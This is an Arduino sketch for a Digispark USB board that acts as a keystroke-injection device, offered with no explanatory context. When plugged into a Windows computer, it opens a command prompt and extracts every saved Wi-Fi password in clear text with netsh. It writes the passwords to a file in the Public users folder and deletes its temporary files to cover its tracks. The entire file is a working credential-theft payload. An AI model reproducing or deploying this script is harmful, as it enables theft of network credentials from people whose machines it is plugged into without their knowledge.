#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print("cd %USERPROFILE% & netsh wlan show profiles | findstr \"All\" > a.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("echo SETLOCAL EnableDelayedExpansion^");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("for /f \"tokens=5*\" %%i in (a.txt) do (^");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("set val=%%i %%j^");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("if \"!val:~-1!\" == \" \" set val=!val:~0,-1!^");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("echo !val!^>^>b.txt) > filter.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("filter.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print(F("(for /f \"tokens=*\" %i in (b.txt\) do @echo     SSID: %i & netsh wlan show profiles name=\"%i\" key=clear | findstr /c:\"Key Content\" & echo.\) > WiFiPasswords.txt"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("del a.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del b.txt");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("del filter.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.print("move WiFiPasswords.txt \\Users\\Public");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
